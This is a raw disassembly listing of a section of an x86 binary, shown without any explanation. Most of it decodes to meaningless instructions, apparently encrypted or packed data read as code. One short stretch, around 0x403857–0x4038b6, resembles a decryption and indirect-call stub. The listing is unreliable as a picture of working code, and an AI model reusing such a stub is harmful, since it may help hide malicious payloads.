  403114:	sbb    DWORD PTR [esi+0x291685c0],0xffffff85
  40311b:	xchg   edx,eax
  40311c:	sub    al,0xfc
  40311e:	daa    
  40311f:	ret    0x6ad
  403122:	sbb    DWORD PTR [esi+0x7f55126],edx
  403128:	hlt    
  403129:	push   esp
  40312a:	mov    cl,0x83
  40312c:	bound  esp,QWORD PTR [edi+eiz*8-0x103ac1ee]
  403133:	push   0xffffffcf
  403135:	stos   DWORD PTR es:[edi],eax
  403136:	pusha  
  403137:	lods   eax,DWORD PTR ds:[esi]
  403138:	dec    eax
  403139:	pusha  
  40313a:	aas    
  40313b:	push   cs
  40313c:	ret    
  40313d:	inc    ebp
  40313e:	jmp    0x4030c9
  403140:	jecxz  0x40314b
  403142:	sub    BYTE PTR [eax],0xba
  403145:	xor    edx,DWORD PTR [eax]
  403147:	sub    BYTE PTR [ebx+0x5e99b9f0],dh
  40314d:	add    BYTE PTR [eax],cl
  40314f:	and    BYTE PTR [ebp+0x37e68114],bh
  403155:	sbb    eax,eax
  403157:	mov    al,0x17
  403159:	mov    ebx,0x9c850edf
  40315e:	inc    edx
  40315f:	(bad)  
  403160:	add    bh,cl
  403162:	mov    esi,0x127a58e
  403167:	adc    ecx,ecx
  403169:	ss popa 
  40316b:	stc    
  40316c:	dec    eax
  40316d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40316e:	sti    
  40316f:	imul   edx
  403171:	int    0x17
  403173:	sbb    dh,BYTE PTR [ebp-0x6196fefb]
  403179:	mov    WORD PTR ds:0xda21f483,fs
  40317f:	dec    ebp
  403180:	cld    
  403181:	fcomp  QWORD PTR [edx-0xa]
  403184:	sub    ebx,ecx
  403186:	adc    DWORD PTR [eax+0x18],edx
  403189:	dec    esi
  40318a:	outs   dx,DWORD PTR ds:[esi]
  40318b:	adc    DWORD PTR [edx],ecx
  40318d:	std    
  40318e:	fwait
  40318f:	call   0x2b25:0x2332adf
  403196:	push   edi
  403197:	sub    eax,0xf159130f
  40319c:	dec    ecx
  40319d:	mov    ds:0xf15b1977,al
  4031a2:	test   ch,bh
  4031a4:	outs   dx,DWORD PTR ds:[esi]
  4031a5:	aas    
  4031a6:	and    dh,bh
  4031a8:	loop   0x403155
  4031aa:	scas   eax,DWORD PTR es:[edi]
  4031ab:	in     eax,dx
  4031ac:	jp     0x403222
  4031ae:	mov    al,BYTE PTR [esi]
  4031b0:	inc    esp
  4031b1:	cmp    ebp,ecx
  4031b3:	mov    dh,0x94
  4031b5:	xchg   ecx,eax
  4031b6:	jmp    0x4031ac
  4031b8:	push   ds
  4031b9:	sbb    al,0xd6
  4031bb:	and    ebx,DWORD PTR [edi-0x76]
  4031be:	int    0x1f
  4031c0:	(bad)  
  4031c1:	adc    al,0x6a
  4031c3:	adc    ch,BYTE PTR [edx+0x71]
  4031c6:	rcl    esi,1
  4031c8:	xor    BYTE PTR [edx-0x35b048ff],dh
  4031ce:	lods   al,BYTE PTR ds:[esi]
  4031cf:	or     eax,0x24bc2d87
  4031d4:	mov    ?,esp
  4031d6:	sbb    cl,BYTE PTR [ecx]
  4031d8:	loop   0x403202
  4031da:	in     eax,0xe1
  4031dc:	inc    eax
  4031dd:	sbb    edx,DWORD PTR [esi]
  4031df:	inc    BYTE PTR [edi]
  4031e1:	in     eax,0x73
  4031e3:	push   0x3627b88e
  4031e8:	pushf  
  4031e9:	loope  0x403213
  4031eb:	add    al,0xc2
  4031ed:	ficomp DWORD PTR [esi]
  4031ef:	clc    
  4031f0:	data16 jnp 0x4031ae
  4031f3:	std    
  4031f4:	pop    ss
  4031f5:	ins    DWORD PTR es:[edi],dx
  4031f6:	stos   DWORD PTR es:[edi],eax
  4031f7:	test   DWORD PTR [edi+0x4cbacd76],0xab2622e
  403201:	pushf  
  403202:	(bad)  
  403203:	cmp    al,0xf0
  403205:	ins    DWORD PTR es:[edi],dx
  403206:	mov    ebp,0xdd66f21e
  40320b:	jl     0x40323e
  40320d:	xchg   edx,eax
  40320e:	pushf  
  40320f:	call   0xcac6:0xd17a7ae2
  403216:	test   al,0x1d
  403218:	jl     0x40321b
  40321a:	aaa    
  40321b:	jns    0x40323a
  40321d:	inc    eax
  40321e:	inc    esi
  40321f:	inc    ebp
  403220:	mov    eax,0xfd4cad6e
  403225:	and    al,0xda
  403227:	mov    eax,0x8acee266
  40322c:	in     al,dx
  40322d:	jbe    0x4031e6
  40322f:	jmp    0xe3561683
  403234:	das    
  403235:	pusha  
  403236:	xor    eax,0x5acd5a43
  40323b:	fcomp  QWORD PTR [edi]
  40323d:	fscale 
  40323f:	mov    cl,0x69
  403241:	sbb    BYTE PTR [esi+ebx*8],0x4d
  403245:	xchg   esi,eax
  403246:	push   edi
  403247:	xchg   ebp,eax
  403248:	popa   
  403249:	xor    DWORD PTR [edi-0x35ba1405],0x41
  403250:	out    dx,al
  403251:	inc    BYTE PTR [eax-0x3b]
  403254:	int3   
  403255:	add    ebp,ebp
  403257:	repnz mov DWORD PTR [edi+0x21],ecx
  40325b:	adc    al,0xb1
  40325e:	cmp    eax,DWORD PTR [edi-0x24651f6f]
  403264:	lods   al,BYTE PTR ds:[esi]
  403265:	cmp    al,0xd7
  403267:	inc    esi
  403268:	xchg   ebp,eax
  403269:	dec    ebx
  40326a:	xchg   ecx,eax
  40326b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40326c:	xchg   bx,ax
  40326e:	fsubp  st(5),st
  403270:	aaa    
  403271:	test   BYTE PTR [esi],dh
  403273:	and    al,0x31
  403275:	mov    al,0x8d
  403277:	loop   0x4032e3
  403279:	outs   dx,DWORD PTR ds:[esi]
  40327a:	inc    ebp
  40327b:	ins    DWORD PTR es:[edi],dx
  40327c:	lock push esp
  40327e:	sti    
  40327f:	mov    dl,0x48
  403281:	int3   
  403282:	mov    esp,0xbbbb758b
  403287:	inc    esp
  403288:	or     dl,BYTE PTR [edi]
  40328a:	cmp    ecx,DWORD PTR [esi]
  40328c:	enter  0x1893,0xf9
  403290:	repnz mov ah,0xc2
  403293:	adc    ch,ah
  403295:	lds    edi,FWORD PTR [esi+0x17b29d79]
  40329b:	xchg   DWORD PTR [edx+ecx*4+0x4b],edi
  40329f:	jns    0x4032ae
  4032a1:	loope  0x403258
  4032a3:	lods   al,BYTE PTR ds:[esi]
  4032a4:	sar    BYTE PTR [esi+0x5665de35],1
  4032aa:	pop    ss
  4032ab:	lock xchg ebx,eax
  4032ad:	fstp   DWORD PTR ds:0xfaaa9436
  4032b3:	add    edx,DWORD PTR [ecx]
  4032b5:	add    bl,BYTE PTR [ecx-0x74456f9e]
  4032bb:	xchg   BYTE PTR [bx],ch
  4032be:	add    BYTE PTR [ecx+0x38],cl
  4032c1:	sub    al,BYTE PTR [ebp-0x330a0c69]
  4032c7:	xchg   BYTE PTR [ebp-0x74],dl
  4032ca:	cwde   
  4032cb:	jl     0x4032a0
  4032cd:	fidivr DWORD PTR [ebp-0x7194c2c5]
  4032d3:	not    BYTE PTR [ebx-0x63]
  4032d6:	or     BYTE PTR [eax-0x6e7200ba],0x7f
  4032dd:	ins    DWORD PTR es:[edi],dx
  4032de:	fucomip st,st(5)
  4032e0:	fmul   QWORD PTR [eax]
  4032e2:	sbb    al,BYTE PTR [ecx+edi*8+0x69]
  4032e6:	fld    QWORD PTR [edx+0x3c]
  4032e9:	pushf  
  4032ea:	fist   DWORD PTR [esp+eax*1-0x4795443c]
  4032f1:	mov    ah,0x69
  4032f3:	ds inc ecx
  4032f5:	fild   WORD PTR ds:0x69613886
  4032fb:	ds cli 
  4032fd:	add    eax,DWORD PTR ds:0x7e5eec34
  403303:	inc    ecx
  403304:	call   0x6e34e17c
  403309:	call   0x9c14:0xaf5e400b
  403310:	dec    ecx
  403311:	xchg   edx,eax
  403312:	clc    
  403313:	xchg   ebp,eax
  403314:	in     eax,dx
  403315:	xlat   BYTE PTR ds:[ebx]
  403316:	mov    esi,0x64b4667f
  40331b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40331c:	or     eax,0x1c63dad3
  403321:	push   es
  403322:	shl    DWORD PTR [edi+0x7179cdbf],1
  403328:	hlt    
  403329:	inc    ebp
  40332a:	fsub   QWORD PTR ds:0x37ffafee
  403330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403331:	inc    edi
  403332:	mov    edx,0xb3a74135
  403337:	rcr    BYTE PTR [ecx-0x50],1
  40333a:	gs xchg esp,eax
  40333c:	pop    eax
  40333d:	and    ebp,DWORD PTR [ebp+0x56]
  403340:	and    cl,BYTE PTR [edi-0x4d1690fc]
  403346:	sbb    ecx,DWORD PTR [ebx-0x1d]
  403349:	mov    ds:0x12598270,al
  40334e:	xor    al,0xbb
  403350:	and    BYTE PTR [ecx-0x43],dh
  403353:	add    DWORD PTR ss:[esi+ebp*8-0x6d3f421d],esp
  40335b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40335c:	inc    BYTE PTR [ebx-0x632cf33a]
  403362:	repz inc edi
  403364:	hlt    
  403365:	xchg   ecx,eax
  403366:	jle    0x403329
  403368:	mov    edi,0x71d0012b
  40336d:	sti    
  40336e:	sub    eax,0x57d09170
  403373:	add    edx,DWORD PTR [ecx]
  403375:	dec    ecx
  403376:	mov    edx,0xb24fb115
  40337b:	xor    edx,edx
  40337d:	or     eax,0x1fc17eb6
  403382:	xor    eax,0x4268efec
  403387:	imul   eax,DWORD PTR [esi-0x1fe43a9f],0xda7cae91
  403391:	(bad)  
  403393:	adc    al,0x5b
  403395:	rol    DWORD PTR [ecx+0x39815714],1
  40339b:	or     dh,BYTE PTR [ecx+0x66]
  40339e:	dec    ecx
  40339f:	mov    eax,ds:0xad1fc21d
  4033a4:	mov    ecx,cs
  4033a6:	push   edx
  4033a7:	push   0xffffffb9
  4033a9:	(bad)  
  4033aa:	xchg   ecx,eax
  4033ab:	push   esi
  4033ac:	cmc    
  4033ad:	pop    edx
  4033ae:	loope  0x403351
  4033b0:	loop   0x403372
  4033b2:	xor    al,0xe8
  4033b4:	retf   
  4033b5:	and    eax,0xff427147
  4033ba:	mov    ebp,0x54b7af32
  4033bf:	fs push ecx
  4033c1:	imul   ebp,eax,0xbf2dbfd7
  4033c7:	push   0x17
  4033c9:	aaa    
  4033ca:	xor    al,0xdc
  4033cc:	call   0xb698246b
  4033d1:	fwait
  4033d2:	dec    ebp
  4033d3:	aam    0x73
  4033d5:	inc    edx
  4033d6:	mov    es,ebx
  4033d8:	mov    edi,0x9b8722c6
  4033dd:	(bad)  
  4033de:	into   
  4033df:	mov    cl,0xcb
  4033e1:	jbe    0x403456
  4033e3:	stc    
  4033e4:	pop    edx
  4033e5:	mov    dl,0xb3
  4033e7:	adc    DWORD PTR [ebp+0x60],ebp
  4033ea:	pop    edi
  4033eb:	push   0xffffffdd
  4033ed:	mov    bl,0x4c
  4033ef:	sub    cl,al
  4033f1:	mov    eax,ds:0x3facd6d5
  4033f6:	repz fisubr DWORD PTR [edi+0x7d6a9c90]
  4033fd:	es mov ch,al
  403400:	aad    0x47
  403402:	repnz test ecx,ebp
  403405:	cdq    
  403406:	call   0xf3222276
  40340b:	pop    eax
  40340c:	cld    
  40340d:	clc    
  40340e:	enter  0xd7e5,0x34
  403412:	adc    DWORD PTR [eax],edi
  403414:	inc    eax
  403415:	xchg   DWORD PTR [eax],eax
  403417:	dec    ecx
  403418:	dec    edx
  403419:	dec    esp
  40341a:	xor    al,0x37
  40341c:	push   esi
  40341d:	ss push esi
  40341f:	xor    BYTE PTR ds:0x997e6716,0xca
  403426:	repz xchg esp,eax
  403428:	enter  0x7385,0x18
  40342c:	ror    ebp,cl
  40342e:	sbb    DWORD PTR [edi+0x24],0xa40af1b9
  403435:	fs push 0xffffffdc
  403438:	repz dec ecx
  40343a:	or     esp,ebx
  40343c:	xchg   edi,eax
  40343d:	inc    esi
  40343e:	(bad)  
  40343f:	jge    0x4034bd
  403441:	stos   DWORD PTR es:[edi],eax
  403442:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  403444:	push   ecx
  403445:	in     al,dx
  403446:	scas   al,BYTE PTR es:[edi]
  403447:	add    eax,0x41dce344
  40344c:	mov    eax,ds:0xd78668da
  403451:	mov    al,ds:0xd0214778
  403456:	int3   
  403457:	retf   0x5b33
  40345a:	fcomp  DWORD PTR [esi]
  40345c:	cmp    al,0x92
  40345e:	loope  0x403481
  403460:	xchg   BYTE PTR [edi],dh
  403462:	push   cs
  403463:	pop    ebp
  403464:	xchg   DWORD PTR [ebx],esp
  403466:	adc    ebx,DWORD PTR [esi-0x66a60f1e]
  40346c:	push   edi
  40346d:	outs   dx,DWORD PTR ds:[esi]
  40346e:	xor    al,0xa7
  403470:	leave  
  403471:	jnp    0x40348c
  403473:	(bad)  [eax+0x69]
  403476:	js     0x40340c
  403478:	mov    ah,0x50
  40347a:	loop   0x40343a
  40347c:	fadd   QWORD PTR [edx]
  40347e:	fs dec ecx
  403480:	les    esi,FWORD PTR [esi+edi*2-0x3e]
  403484:	xchg   esp,eax
  403485:	popf   
  403486:	xchg   edx,eax
  403487:	mov    esp,0xb64af244
  40348c:	pop    ss
  40348d:	jbe    0x4034d5
  40348f:	push   es
  403490:	daa    
  403491:	dec    DWORD PTR [ebx-0x3f]
  403494:	ret    
  403495:	dec    ebp
  403496:	(bad)  
  403497:	xor    al,0x16
  403499:	aam    0xe0
  40349b:	sbb    DWORD PTR [ebx],edx
  40349d:	push   ebp
  40349e:	mov    edx,esi
  4034a0:	inc    ebp
  4034a1:	jl     0x403505
  4034a3:	icebp  
  4034a4:	(bad)  
  4034a5:	mov    al,ds:0xad7b300b
  4034aa:	aaa    
  4034ab:	sar    BYTE PTR [eax],0x66
  4034ae:	pop    es
  4034af:	mov    ecx,0x5135b605
  4034b4:	and    edx,DWORD PTR [esi+ecx*4]
  4034b7:	ds dec eax
  4034b9:	lahf   
  4034ba:	xor    BYTE PTR [eax+0x5dee20fd],0x80
  4034c1:	stos   DWORD PTR es:[edi],eax
  4034c2:	pop    ebp
  4034c3:	int    0x97
  4034c5:	push   0xffffffdd
  4034c7:	xchg   esi,eax
  4034c8:	adc    al,0x95
  4034ca:	aad    0x23
  4034cc:	adc    al,0x42
  4034ce:	int    0x13
  4034d0:	cmp    DWORD PTR [edi-0x38],edx
  4034d3:	fistp  QWORD PTR [esi-0x64]
  4034d6:	adc    esp,DWORD PTR [esi-0x330727b5]
  4034dc:	xchg   ebp,eax
  4034dd:	and    DWORD PTR [ebp+ebx*4+0x2f],eax
  4034e1:	push   ds
  4034e2:	jp     0x40355b
  4034e4:	in     eax,0xd0
  4034e6:	or     esp,esp
  4034e8:	mov    esp,0xaf928714
  4034ed:	imul   ebp,DWORD PTR [edi],0x8
  4034f0:	ja     0x4034a0
  4034f2:	mov    dh,0xa2
  4034f4:	or     ebx,ebp
  4034f6:	mov    WORD PTR [edx-0x2debeaa6],ss
  4034fc:	xchg   DWORD PTR [edx],ebx
  4034fe:	mov    eax,ds:0xb45bfcca
  403503:	jp     0x4034ca
  403505:	lock jmp 0x2f7ba0a8
  40350b:	mov    dl,0x43
  40350d:	inc    esp
  40350e:	push   edi
  40350f:	sbb    al,0xac
  403511:	das    
  403512:	mov    ss,ebx
  403514:	or     DWORD PTR [edi-0x403e3219],eax
  40351a:	sub    dh,ch
  40351c:	fsub   QWORD PTR [esp+esi*8-0x3b69f836]
  403523:	xor    BYTE PTR [ecx-0x49],al
  403526:	mov    edi,0x30d9a6ef
  40352b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40352c:	jne    0x4035a3
  40352e:	xchg   esi,eax
  40352f:	or     eax,0x3c8e483f
  403534:	aad    0xc3
  403536:	loop   0x403591
  403538:	mov    ecx,0x538e3852
  40353d:	call   0xcc0fe0d1
  403542:	mov    ds:0xf32fb513,al
  403547:	(bad)  
  403548:	loope  0x40358d
  40354a:	xchg   ebp,eax
  40354b:	loopne 0x40352a
  40354d:	daa    
  40354e:	cmp    ax,0x8172
  403552:	enter  0x1a38,0x53
  403556:	mov    edx,0x69c0ed8c
  40355b:	pop    eax
  40355c:	rcr    DWORD PTR [edx-0x667e25f0],1
  403562:	or     eax,0x343a745e
  403567:	jl     0x4035a1
  403569:	jl     0x40353d
  40356b:	imul   ecx,DWORD PTR ds:0xc2101696,0x45
  403572:	cwde   
  403573:	mov    ch,0xd9
  403575:	add    DWORD PTR [eax+0x41],ecx
  403578:	lds    ecx,FWORD PTR [esi+0x7e]
  40357b:	outs   dx,DWORD PTR ds:[esi]
  40357c:	fcmovnu st,st(3)
  40357e:	ss popf 
  403580:	fbld   TBYTE PTR [edx]
  403582:	cmp    ecx,DWORD PTR [ebx+0x2cac2543]
  403588:	pop    edi
  403589:	imul   ecx,eax,0x725371c8
  40358f:	mov    esi,0xeb19556d
  403594:	push   ss
  403595:	dec    edi
  403596:	call   0x50f59876
  40359b:	and    ah,ch
  40359d:	js     0x403606
  40359f:	jecxz  0x4035ab
  4035a1:	mov    bl,0xff
  4035a3:	ret    0x9292
  4035a6:	adc    bl,BYTE PTR [edi-0x49dcead8]
  4035ac:	or     DWORD PTR [edx],eax
  4035ae:	sub    eax,DWORD PTR [ebp-0x6b541919]
  4035b4:	push   eax
  4035b5:	in     al,0xf1
  4035b7:	pop    ebx
  4035b8:	sti    
  4035b9:	push   esi
  4035ba:	cmp    DWORD PTR [ebp+0x55],esi
  4035bd:	rcr    DWORD PTR [edx+0xfe39290],1
  4035c3:	fmul   QWORD PTR [eax]
  4035c5:	mov    eax,0x933d4165
  4035ca:	jne    0x403562
  4035cc:	push   ss
  4035cd:	sub    BYTE PTR [edi-0x5b],0x38
  4035d1:	cmp    dh,BYTE PTR [esi+0x506beede]
  4035d7:	fisub  DWORD PTR [esi-0x76]
  4035da:	xchg   ebx,eax
  4035db:	les    ebx,FWORD PTR [edi]
  4035dd:	mov    esp,0x87450d14
  4035e2:	add    al,0x5e
  4035e4:	mov    esp,DWORD PTR [eax-0x10]
  4035e7:	imul   esi,DWORD PTR [eax+0x5b],0xffffffb4
  4035eb:	std    
  4035ec:	retf   0x4da9
  4035ef:	inc    eax
  4035f0:	sbb    DWORD PTR [edx],ecx
  4035f2:	rcl    DWORD PTR [ebp+0x5291bc8a],1
  4035f8:	inc    esi
  4035fa:	add    ch,dl
  4035fc:	ret    
  4035fd:	cmp    eax,0xf0b43863
  403602:	js     0x40360a
  403604:	cdq    
  403605:	in     al,dx
  403606:	aaa    
  403607:	xor    esi,0xffffff88
  40360a:	xchg   BYTE PTR [ecx-0x796568bb],al
  403610:	mov    DWORD PTR [ecx+0x4b],0x81142336
  403617:	push   cs
  403618:	adc    BYTE PTR [esi],bl
  40361a:	push   ecx
  40361b:	shl    DWORD PTR [ecx-0x45],1
  40361e:	aas    
  40361f:	mov    bl,ch
  403621:	mov    ds:0x26cea0bf,al
  403626:	inc    esp
  403627:	mov    dl,0xad
  403629:	pop    ebx
  40362a:	pop    DWORD PTR [esi+ecx*1]
  40362d:	xchg   ebp,eax
  40362e:	xchg   edx,eax
  40362f:	inc    esp
  403630:	test   BYTE PTR [ebp+0x4ae24207],dl
  403636:	test   eax,0x6fc4af6
  40363b:	mov    DWORD PTR [ecx-0x55],esp
  40363e:	loop   0x4036a8
  403640:	jmp    0xcc869aa4
  403645:	cmc    
  403646:	jnp    0x403685
  403648:	sbb    cl,dh
  40364a:	mov    esp,0xc8e0ba91
  40364f:	cwde   
  403650:	push   edx
  403651:	inc    esi
  403652:	cmp    ebp,esp
  403654:	inc    ebp
  403655:	shl    bh,0x55
  403658:	test   eax,0x57fdc3ae
  40365d:	sub    eax,0x85c00f2f
  403662:	adc    DWORD PTR [esi+0x7c],ebp
  403665:	jl     0x40367f
  403667:	mov    ds:0x273ef06,al
  40366c:	adc    ah,BYTE PTR [eax-0x3f]
  40366f:	mov    esi,0x1a2100e
  403674:	mov    eax,ds:0x2a278262
  403679:	mov    WORD PTR [ebx+0x128ae974],?
  40367f:	pop    ebx
  403680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403681:	xor    al,0xf9
  403683:	test   eax,0x4a2363a6
  403688:	and    BYTE PTR [edx],al
  40368a:	sbb    BYTE PTR [eax+0xf],ch
  40368d:	lea    esp,[ebp+0x6b]
  403690:	lahf   
  403691:	add    eax,0x2016a673
  403696:	ss pushf 
  403698:	add    dl,BYTE PTR [bp+di]
  40369b:	test   BYTE PTR [esi-0x155502f3],bh
  4036a1:	fldcw  WORD PTR [esi+eiz*2-0x48cfc29e]
  4036a8:	retf   
  4036a9:	mov    cl,0x25
  4036ab:	repz mov ebx,0xf3d3cc9e
  4036b1:	fbld   TBYTE PTR [ebp+0x2e]
  4036b4:	(bad)  
  4036b5:	jb     0x403732
  4036b7:	(bad)  
  4036b8:	scas   al,BYTE PTR es:[edi]
  4036b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036ba:	bound  esp,QWORD PTR [esi-0x10f4858a]
  4036c0:	lds    edi,FWORD PTR [edx-0x5965faba]
  4036c6:	jne    0x403724
  4036c8:	in     al,0x98
  4036ca:	mov    al,BYTE PTR [eax]
  4036cc:	into   
  4036cd:	push   0x3f57e42a
  4036d2:	cmp    edi,DWORD PTR [ecx+0x62]
  4036d5:	outs   dx,DWORD PTR ds:[esi]
  4036d6:	push   ebp
  4036d7:	retf   0x2c19
  4036da:	sar    DWORD PTR [edx-0x29],0xc
  4036de:	(bad)  
  4036df:	out    0x1c,eax
  4036e1:	mov    ds,WORD PTR ss:[esi-0x17626ea3]
  4036e8:	mov    eax,ds:0x2d5218ba
  4036ed:	cwde   
  4036ee:	pop    esi
  4036ef:	das    
  4036f0:	out    0xe1,eax
  4036f2:	push   ebx
  4036f3:	retf   0x18b9
  4036f6:	mov    edi,0x200d0ae3
  4036fb:	test   al,0xc7
  4036fd:	test   edx,ebx
  4036ff:	cmp    eax,0xfdc6e71e
  403705:	push   ebp
  403706:	(bad)  
  403707:	and    al,BYTE PTR [eax+0x3d5c2088]
  40370d:	mov    ch,0xa8
  40370f:	mov    ds:0xb30d55c3,eax
  403714:	mov    ebp,DWORD PTR [esi-0x20]
  403717:	adc    eax,0xbc4e4ea4
  40371c:	pusha  
  40371d:	aam    0x94
  40371f:	xchg   ebp,eax
  403720:	sbb    eax,0xbb4a5fa
  403725:	jbe    0x40372e
  403727:	fistp  DWORD PTR [edx+0x1a]
  40372a:	rcr    BYTE PTR [edx+0x2acaf4fd],0x35
  403731:	xchg   ebp,eax
  403732:	adc    al,BYTE PTR [ecx+0x5eed0155]
  403738:	inc    ebx
  403739:	int    0x45
  40373b:	das    
  40373c:	rol    ah,0xac
  40373f:	and    eax,0xdd6ed127
  403744:	iret   
  403745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403746:	or     edx,esi
  403748:	(bad)  
  403749:	pusha  
  40374a:	sub    esi,DWORD PTR [eax+0x64]
  40374d:	shl    al,cl
  40374f:	les    esp,FWORD PTR [edi-0x4c]
  403752:	les    esp,FWORD PTR ds:0xb067ed8
  403758:	rcr    DWORD PTR [ebx-0x9b9db30],1
  40375e:	push   es
  40375f:	or     al,0x59
  403761:	mov    ebx,0xa5186409
  403766:	mov    edi,0xcd4f18d2
  40376b:	(bad)  
  40376c:	mov    edx,0x48b08a16
  403771:	addr16 jb 0x40373c
  403774:	jo     0x403773
  403776:	sbb    dh,0x9b
  403779:	(bad)  
  40377a:	mov    bl,0x10
  40377c:	fs dec ecx
  40377e:	cmp    BYTE PTR [edi+0x4e],bh
  403781:	inc    edx
  403782:	jo     0x40376a
  403784:	mov    al,ds:0x4d5f695d
  403789:	adc    DWORD PTR [eax],0x5a
  40378c:	into   
  40378d:	lods   eax,DWORD PTR ds:[esi]
  40378e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40378f:	dec    esi
  403790:	aad    0x36
  403792:	sbb    al,0x66
  403794:	inc    esi
  403795:	inc    esp
  403796:	bndldx bnd1,[ebx-0x5ef6d5e2]
  40379d:	cdq    
  40379e:	sub    edx,DWORD PTR [eax+0x13]
  4037a1:	mov    esp,0x43ff6fad
  4037a6:	or     BYTE PTR [ecx-0x51722798],0xcd
  4037ad:	pop    ebx
  4037ae:	add    eax,0x5c7fff23
  4037b3:	dec    ebp
  4037b4:	shl    ch,0x97
  4037b7:	dec    ebp
  4037b8:	mov    cl,0xe8
  4037ba:	jo     0x4037fc
  4037bc:	mov    ch,0x4c
  4037be:	pop    ss
  4037bf:	fnstcw WORD PTR [ebx]
  4037c1:	add    esi,DWORD PTR [esi]
  4037c3:	out    0xa3,eax
  4037c5:	push   ebx
  4037c6:	sahf   
  4037c7:	or     cl,BYTE PTR [eax-0x37cb183d]
  4037cd:	add    al,0x51
  4037cf:	aam    0xc4
  4037d1:	mov    dl,0x6e
  4037d3:	clc    
  4037d4:	gs mov ebx,0xa54ed037
  4037da:	and    eax,0x5efafeb9
  4037df:	addr16 pop ss
  4037e1:	and    BYTE PTR [edx+0x20],0x1b
  4037e5:	and    esp,DWORD PTR [edx+0x35]
  4037e8:	inc    edx
  4037e9:	gs pusha 
  4037eb:	shl    BYTE PTR [edx+ecx*1],cl
  4037ee:	inc    eax
  4037ef:	add    ah,bh
  4037f1:	mov    DWORD PTR [ecx+0x42a36e30],edx
  4037f7:	loope  0x40379d
  4037f9:	xchg   ebx,eax
  4037fa:	std    
  4037fb:	jno    0x4037c6
  4037fd:	or     dh,BYTE PTR [ebp+0x37778c4c]
  403803:	jae    0x4037c4
  403805:	inc    esp
  403806:	stos   DWORD PTR es:[edi],eax
  403807:	aad    0x52
  403809:	dec    edi
  40380a:	jo     0x403851
  40380c:	loope  0x403873
  40380e:	push   esi
  40380f:	loopne 0x403861
  403811:	inc    ecx
  403812:	or     al,0x16
  403814:	mov    al,ds:0xb25cc97f
  403819:	cwde   
  40381a:	mov    ebp,0x790a8da2
  40381f:	mov    ds:0x31a9ef9,eax
  403824:	out    0xd4,al
  403826:	or     eax,esp
  403828:	jmp    0x403826
  40382a:	out    dx,eax
  40382b:	dec    esp
  40382c:	out    dx,al
  40382d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40382e:	addr16 ret 
  403830:	ret    0xc86
  403833:	repnz mov eax,ds:0xbb603e2a
  403839:	sub    al,BYTE PTR ds:0xa67034e3
  40383f:	cmp    al,0x50
  403841:	imul   edi,DWORD PTR [bp+di-0x1489],0x68
  403847:	mov    dl,0xa2
  403849:	add    BYTE PTR [ebp+ecx*1-0x38],dl
  40384d:	mov    dl,0xe9
  40384f:	ficomp DWORD PTR [ebx-0x25]
  403852:	call   0xf48539cd
  403857:	mov    eax,DWORD PTR [ebp-0xc]
  40385a:	mov    ecx,DWORD PTR [ebp-0x8]
  40385d:	mov    ecx,DWORD PTR [ecx]
  40385f:	mov    ecx,DWORD PTR [ecx]
  403861:	mov    ecx,DWORD PTR [ecx]
  403863:	mov    DWORD PTR [ecx+0x1],eax
  403866:	mov    al,BYTE PTR [ebp-0x1]
  403869:	mov    ecx,DWORD PTR [ebp-0x8]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    ecx,DWORD PTR [ecx]
  403872:	push   DWORD PTR [ebp-0x2c]
  403875:	xor    al,0x6f
  403877:	sub    al,0xd
  403879:	mov    BYTE PTR [ecx],al
  40387b:	mov    eax,ds:0x4217ce
  403880:	push   DWORD PTR [eax]
  403882:	push   DWORD PTR ds:0x421a2a
  403888:	push   DWORD PTR ds:0x4217d6
  40388e:	push   DWORD PTR ds:0x421a0a
  403894:	push   DWORD PTR ds:0x421a9e
  40389a:	push   DWORD PTR [ebp-0x30]
  40389d:	push   DWORD PTR [ebp-0x20]
  4038a0:	mov    eax,DWORD PTR [ebp-0x8]
  4038a3:	mov    eax,DWORD PTR [eax]
  4038a5:	mov    eax,DWORD PTR [eax]
  4038a7:	mov    eax,DWORD PTR [eax]
  4038a9:	call   eax
  4038ab:	mov    eax,DWORD PTR [ebp-0x34]
  4038ae:	mov    ecx,DWORD PTR ds:0x4219ce
  4038b4:	add    DWORD PTR [eax],ecx
  4038b6:	jmp    0x405c6b
  4038bb:	fnstenv [edx-0x73]
  4038be:	xchg   ebp,eax
  4038bf:	gs xchg ebp,eax
  4038c1:	test   eax,0x7c0e640e
  4038c6:	sbb    cl,BYTE PTR [edx]
  4038c8:	lock adc al,al
  4038cb:	retf   0x625f
  4038ce:	(bad)  
  4038cf:	retf   0x625f
  4038d2:	(bad)  
  4038d4:	retf   
  4038d5:	clc    
  4038d6:	sub    ch,al
  4038d8:	in     al,0x1c
  4038da:	jp     0x403891
  4038dc:	call   0x4a9dc70
  4038e1:	repnz mov eax,ds:0x12661a5a
  4038e7:	or     DWORD PTR [esi-0x59340374],ebx
  4038ed:	mov    edx,0xe8a7ff9d
  4038f2:	add    eax,0xa6a99f85
  4038f7:	mov    ebx,0xd6f5264b
  4038fc:	xor    eax,0xcb181085
  403901:	mov    esp,0x7112512c
  403906:	sbb    al,0xe8
  403908:	xchg   ebx,eax
  403909:	lods   eax,DWORD PTR ds:[esi]
  40390a:	inc    edx
  40390b:	add    eax,0x9e698c6c
  403910:	adc    ah,BYTE PTR [ebx-0x49e56154]
  403916:	sbb    bh,bl
  403918:	mov    al,ds:0x6e8f8141
  40391d:	jl     0x403989
  40391f:	inc    ecx
  403920:	inc    edi
  403921:	(bad)  
  403922:	popa   
  403923:	adc    eax,DWORD PTR [eax+eax*1]
  403926:	mov    edx,0xed81f20e
  40392b:	aad    0x8e
  40392d:	and    al,0x68
  40392f:	test   al,0x1f
  403931:	xchg   edx,eax
  403932:	push   es
  403933:	jmp    0xd92a:0x468e8eb
